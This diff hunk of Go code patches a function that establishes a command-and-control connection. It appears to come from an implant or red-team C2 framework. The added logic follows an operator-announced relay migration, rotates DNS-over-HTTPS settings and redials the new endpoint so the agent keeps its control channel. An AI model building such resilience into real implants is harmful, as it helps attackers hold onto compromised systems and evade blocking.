@@ -60,6 +60,17 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 		rw, dialErr = establishChannelStream(ctx, url, channelWrapper)
 		if dialErr != nil {
 			tried[url] = true
+			// Operator hot-migration: the relay closed us with 4002 + the new
+			// endpoint. It outranks the embedded endpoint list (which may
+			// predate the migration) — dial the announced endpoint directly.
+			if mig := transport.RelayMigration(); mig != "" && mig != url && !tried[mig] {
+				logging.Warningf("relay migrated by operator, switching from %s to %s",
+					maskURLSecret(url), maskURLSecret(mig))
+				rotateDoH(url, mig)
+				def.CCAddress = mig
+				url = mig
+				continue
+			}
 			nextRelayEndpoint(url)
 			nextURL := def.CCAddress
 			if nextURL == url || tried[nextURL] {
